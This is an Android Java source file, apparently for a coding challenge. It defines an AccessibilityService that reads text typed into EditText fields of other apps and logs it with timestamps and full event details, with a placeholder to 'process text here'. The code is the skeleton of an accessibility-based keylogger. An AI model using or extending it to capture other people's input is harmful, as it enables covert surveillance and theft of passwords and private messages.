package ir.javadsh.challenge;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;


public class TextAccessibilityService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Log.d(ApplicationClass.DEBUG_TAG, "TextAccessibilityService is onAccessibilityEventB");

        AccessibilityNodeInfo info = event.getSource();

        if (info == null || info.getText() == null || info.getClassName() == null || !event.getClassName().equals("android.widget.EditText")
                || event.getPackageName().equals(getPackageName())) {

            return;
        } else {
            String inputText = event.getText().toString();
            String recorderTime = String.valueOf(event.getEventTime());
            Log.d(ApplicationClass.DEBUG_TAG, "text string is : " + inputText);
            Log.d(ApplicationClass.DEBUG_TAG, "recorderTime is : " + recorderTime);
            Log.d(ApplicationClass.DEBUG_TAG, "whole event is : " + event.toString());
            Log.d(ApplicationClass.DEBUG_TAG, "whole info is : " + info.toString());
            // process text here
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(ApplicationClass.DEBUG_TAG, "TextAccessibilityService is onInterrupt");
    }
}